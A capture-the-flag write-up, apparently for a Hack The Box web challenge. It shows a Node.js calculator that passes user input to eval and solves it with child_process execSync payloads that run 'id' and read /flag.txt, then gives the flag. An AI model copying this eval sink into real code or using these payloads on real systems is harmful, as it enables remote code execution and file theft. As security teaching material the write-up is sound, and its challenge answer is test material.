# Web

## Description

In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! 🦑
## Source

`index.js`
```js
const express       = require('express');
const app           = express();
const bodyParser    = require('body-parser');
const routes        = require('./routes');
const path          = require('path');

app.use(bodyParser.json());

app.set('views', './views');
app.use('/static', express.static(path.resolve('static')));

app.use(routes);

app.all('*', (req, res) => {
    return res.status(404).send({
        message: '404 page not found'
    });
});

app.listen(1337, () => console.log('Listening on port 1337'));
```

`routes/index.js`
```js
const path       = require('path');
const express    = require('express');
const router     = express.Router();
const Calculator = require('../helpers/calculatorHelper');

const response = data => ({ message: data });

router.get('/', (req, res) => {
	return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/calculate', (req, res) => {
	let { formula } = req.body;

	if (formula) {
		result = Calculator.calculate(formula);
		return res.send(response(result));
	}

	return res.send(response('Missing parameters'));
})

module.exports = router;
```

`helpers/calculatorHelper.js`
```js
module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${ formula } ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
}
```
## Solution

Since the input is going directly into server side `eval` function, we can perform command injection via modules.

```js
require('child_process').execSync('id').toString()
```

![jscalc.png](/assets/ctf/htb/web/jscalc.png)

```js
require('child_process').execSync('cat /flag.txt').toString()
```

![jscalc-1.png](/assets/ctf/htb/web/jscalc-1.png)

> Flag: `HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}`

